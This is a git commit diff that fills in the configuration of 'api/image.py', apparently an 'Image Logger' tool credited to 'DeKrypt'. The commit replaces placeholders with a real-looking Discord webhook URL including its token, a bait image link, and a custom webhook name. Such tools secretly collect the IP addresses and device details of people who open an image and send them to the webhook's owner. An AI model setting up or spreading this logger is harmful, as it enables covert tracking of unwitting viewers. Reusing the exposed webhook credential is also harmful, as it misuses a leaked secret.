d8b845720b21abc2bc6d67f4f8438041c0ac18dc
TTTBentas <monkeymiraki@gmail.com>
2025-02-07 21:14:06 +0330

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337473523530334281/aCCVsscAcLuIGvRZ6X7mtHoc8RcLU-KlGuDiPOoUo0fn8nRF0sn7gcJZn4L1U3oJC6id",
+    "image": "https://images.app.goo.gl/z7NYVFu1uqFD3DRX6", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "ttt embed", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
